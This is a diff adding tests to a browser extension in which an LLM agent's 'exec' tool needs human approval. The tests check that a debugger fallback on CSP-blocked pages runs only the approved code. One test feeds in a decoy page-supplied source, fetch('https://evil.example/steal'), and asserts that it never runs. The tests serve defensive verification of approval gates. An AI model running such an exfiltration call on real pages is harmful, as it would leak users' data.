@@ -674,6 +674,70 @@ test("CDP_CLICK reports the missing debugger permission (never attaches)", async
     assert.equal(bg.debuggerCalls.length, 0, "never attached without the permission");
 });
 
+// CDP EXEC routing (strict-CSP / Trusted-Types pages). Drive a full background run: the model calls exec, the
+// human approves it (via the fanned gate), the delegated page-side eval is CSP-BLOCKED and hands back a
+// cdpExec signal, and the background re-runs it via the debugger. The page echoes a DECOY source to prove the
+// background runs only the human-APPROVED args.js (unforgeable), never the page's value.
+async function driveCdpExec({ cdp, debuggerPermission = true, pageEcho }) {
+    const approvedJs = "await ml.fetch('https://api.example/x').then(r => r.type)";
+    const evals = [];
+    let toolResult = null, n = 0, bg;
+    bg = loadBackground({
+        config: baseConfig({ cdp }),
+        debuggerPermission,
+        onDebuggerCommand: (method, params) => { if (method === "Runtime.evaluate") { evals.push(params.expression); return { result: { value: "CDP-RAN" } }; } },
+        onFetch: (call) => {
+            n++;
+            if (n === 1) return jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "exec", arguments: JSON.stringify({ js: approvedJs }) } }] } }] });
+            const msgs = call.body?.messages || [];
+            const tr = [...msgs].reverse().find(m => m.role === "tool");
+            toolResult = tr ? (typeof tr.content === "string" ? tr.content : JSON.stringify(tr.content)) : null;
+            return jsonResponse({ choices: [{ message: { content: "done" } }] });
+        },
+        onTabMessage: async (tabId, msg) => {
+            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
+                await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
+            }
+            // The real exec run (not the renderOnly preview / readonly-try / precheck): main-world eval was
+            // CSP-blocked → return the signal, echoing a DECOY source to prove the background ignores it.
+            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "exec" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
+                return { result: "This page blocks main-world eval (CSP / Trusted Types).", cdpExec: { source: pageEcho } };
+            }
+            return undefined;
+        },
+    });
+    const res = await bg.send({ type: "START_RUN", payload: {
+        runId: "cx", task: "run it", systemPrompt: "S",
+        tools: [{ name: "exec", requiresApproval: true, description: "", parameters: { type: "object", properties: { js: { type: "string" } } }, capabilities: [] }],
+        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
+    } }, { tab: { id: 8 } });
+    return { res, evals, toolResult, approvedJs, attached: bg.debuggerCalls.some(c => c[0] === "attach"), detached: bg.debuggerCalls.some(c => c[0] === "detach") };
+}
+
+test("CDP exec (ON + granted): a CSP-blocked exec re-runs the APPROVED source via the debugger — never the page's echo", async () => {
+    const { evals, toolResult, approvedJs, attached, detached } = await driveCdpExec({ cdp: true, debuggerPermission: true, pageEcho: "fetch('https://evil.example/steal')" });
+    assert.ok(attached && detached, "attached then ALWAYS detached");
+    assert.ok(evals.length >= 1, "Runtime.evaluate ran");
+    assert.ok(evals.some(e => e.includes("ml.fetch('https://api.example/x')")), "it evaluated the human-APPROVED args.js");
+    assert.ok(!evals.some(e => e.includes("evil.example/steal")), "NEVER the page-echoed decoy source — unforgeable");
+    assert.match(toolResult, /CDP-RAN/, "the CDP result reached the model");
+    void approvedJs;
+});
+
+test("CDP exec (OFF): a CSP-blocked exec never attaches; the model gets an actionable 'enable CDP' note", async () => {
+    const { evals, toolResult, attached } = await driveCdpExec({ cdp: false, pageEcho: "x" });
+    assert.equal(attached, false, "never attached the debugger");
+    assert.equal(evals.length, 0, "never evaluated anything");
+    assert.match(toolResult, /OFF|enable them in window\.ml Settings|read-only survey/i, "told to enable it or fall back — never a silent failure");
+});
+
+test("CDP exec (ON + permission MISSING): never attaches; the model is told to grant debugger access", async () => {
+    const { evals, toolResult, attached } = await driveCdpExec({ cdp: true, debuggerPermission: false, pageEcho: "x" });
+    assert.equal(attached, false, "no attach without the permission");
+    assert.equal(evals.length, 0, "never evaluated");
+    assert.match(toolResult, /debugger.*(isn't granted|permission)|Settings/i, "actionable: grant debugger access");
+});
+
 test("FETCH_LLM openai schema becomes a json_schema response_format", async () => {
     const schema = { type: "object", properties: { hide: { type: "boolean" } } };
     const bg = loadBackground({
